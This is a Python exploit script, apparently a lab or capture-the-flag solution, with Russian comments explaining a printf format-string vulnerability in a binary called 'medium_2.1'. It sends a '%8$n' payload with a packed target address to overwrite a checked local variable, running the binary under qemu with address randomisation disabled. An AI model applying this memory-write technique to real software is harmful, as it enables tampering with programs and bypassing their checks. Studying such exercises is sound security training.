import struct
import subprocess


# В main переменная var_4 инициализируется нулём, а после vulnerable
# проверяется условием. Вызов printf с пользовательским форматом уязвим:
# %n записывает число уже напечатанных символов по указателю-аргументу.
# Абсолютный адрес привязан к данной среде и может измениться в другой.
# Перед подбором адреса стек исследовался форматом %16$p; затем смещение
# локальной переменной из IDA (-4 от RBP) использовалось для вычисления target.
target = 0xFFFFF71EED0C

# Буква A выводится первой, значит к моменту %8$n счётчик равен 1.
# %8$n выбирает восьмой позиционный аргумент; указатель на target находится
# в буфере со смещением 16 байт. Пробелы и NUL отделяют формат от указателя.
payload = (
    b"A%8$n"
    + b" " * 10
    + b"\x00"
    + struct.pack("<Q", target)
    + b"\n"
)

subprocess.run(
    [
        # setarch -R задаёт использованный режим без рандомизации адресов
        # далее ELF запускается штатным загрузчиком.
        "setarch",
        "aarch64",
        "-R",
        "qemu-amd64",
        "-L",
        "/",
        "/lib64/ld-linux-x86-64.so.2",
        "./medium_2.1",
    ],
    input=payload,
    # Не прерываем скрипт исключением, если программа возвращает ненулевой код.
    check=False,
)
